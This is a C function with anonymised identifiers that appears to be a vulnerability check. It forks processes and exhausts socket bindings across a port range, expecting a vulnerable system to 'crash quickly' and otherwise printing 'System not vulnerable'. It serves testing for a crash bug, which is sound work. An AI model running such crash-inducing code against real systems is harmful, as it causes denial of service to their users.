#define NULL ((void*)0)
typedef unsigned long size_t;  // Customize by platform.
typedef long intptr_t; typedef unsigned long uintptr_t;
typedef long scalar_t__;  // Either arithmetic or pointer type.
/* By default, we understand bool (as a convenience). */
typedef int bool;
#define false 0
#define true 1

/* Forward declarations */

/* Type definitions */
typedef  int /*<<< orphan*/  uint16_t ;
typedef  scalar_t__ pid_t ;

/* Variables and functions */
 int /*<<< orphan*/  EADDRINUSE ; 
 int /*<<< orphan*/  EMFILE ; 
 int FUNC0 (int) ; 
 int /*<<< orphan*/  FUNC1 (int) ; 
 int /*<<< orphan*/  FUNC2 (int /*<<< orphan*/ ) ; 
 int /*<<< orphan*/  FUNC3 (int) ; 
 int /*<<< orphan*/  errno ; 
 int /*<<< orphan*/  FUNC4 (int) ; 
 scalar_t__ FUNC5 () ; 
 int FUNC6 () ; 
 int /*<<< orphan*/  FUNC7 (int /*<<< orphan*/ *) ; 
 scalar_t__ FUNC8 () ; 
 int /*<<< orphan*/  FUNC9 (char*) ; 
 int /*<<< orphan*/  FUNC10 (int*) ; 

__attribute__((used)) static int
FUNC11 (void)
{
	int lim, val = 2;
	pid_t pid, ppid;
	uint16_t range[2], port;

	lim = FUNC6 ();
	if (lim <= 3)
		return -2;

	FUNC7 (range);

	port = range[0];
	ppid = FUNC8 ();

	FUNC9 ("Stage 1...");
	do
	{
		switch (pid = FUNC5 ())
		{
			case 0:
				for (val = 3; val < lim; val++)
					FUNC3 (val);

				do
				{
					if (FUNC2 (port) >= 0)
					{
						if (port)
							port++;
					}
					else
					if (port && (errno == EADDRINUSE))
						port++; /* skip already used port */
					else
					if (errno != EMFILE)
						/* EAFNOSUPPORT -> no IPv6 stack */
						/* EADDRINUSE -> not vulnerable */
						FUNC4 (1);

					if (port > range[1])
					{
						FUNC9 ("Stage 2... should crash quickly");
						port = 0;
					}
				}
				while (errno != EMFILE);

				break; /* EMFILE: spawn new process */

			case -1:
				FUNC4 (2);

			default:
				FUNC10 (&val);
				if (ppid != FUNC8 ())
					FUNC4 (FUNC1 (val) ? FUNC0 (val) : 2);
		}
	}
	while (pid == 0);

	FUNC9 ("System not vulnerable");
	return -val;
}